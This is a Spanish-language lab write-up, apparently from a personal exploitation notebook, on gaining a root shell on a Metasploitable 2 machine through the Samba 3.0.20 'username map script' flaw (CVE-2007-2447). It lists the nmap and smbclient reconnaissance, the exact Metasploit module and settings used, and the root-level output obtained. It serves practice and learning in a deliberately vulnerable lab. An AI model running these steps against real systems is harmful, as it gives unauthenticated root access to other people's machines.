🛠️ Explotación de Samba 3.0.20 - CVE-2007-2447 (Metasploitable 2)

🎯 Objetivo

Explotar una vulnerabilidad en el servicio Samba 3.0.20 corriendo en Metasploitable 2 para obtener ejecución remota de comandos como root.Este fallo permite abusar del parámetro username map script y obtener una shell directamente.

🧠 Detalles técnicos

📌 Vulnerabilidad: CVE-2007-2447

🧹 Servicio vulnerable: Samba 3.0.20-Debian

📍 Puerto: 445/TCP

💽 IP del objetivo: 192.168.1.149

🎯 Nivel de acceso: ROOT ⚡

🔍 Escaneo de servicios

nmap -sV -sC -p 445 -Pn -oN samba_scan.txt 192.168.1.149


📁 Enumeración con smbclient

Antes de lanzar el exploit, revisamos los recursos compartidos de Samba:

smbclient -L //192.168.1.149 -U%


🚀 Explotación con Metasploit

1️⃣ Iniciar Metasploit:

msfconsole

2️⃣ Cargar el módulo de Samba:

use exploit/multi/samba/usermap_script

3️⃣ Configurar el exploit:

set RHOSTS 192.168.1.149
set RPORT 445
set payload cmd/unix/interact
run


💡 Comprobación de acceso

whoami
id
uname -a

Resultado Obtenido:

root
uid=0(root) gid=0(root)
Linux metasploitable 2.6.x ...

✅ Conclusión

Esta vulnerabilidad en Samba permite obtener una shell remota como root sin autenticación, abusando de cómo la aplicación maneja los mapas de nombres de usuario. Es un ejemplo clásico de ejecución remota (RCE) 💥.

📁 Evidencias

Ubicadas en:exploits/samba-usermap-cve2007-2447/evidencias/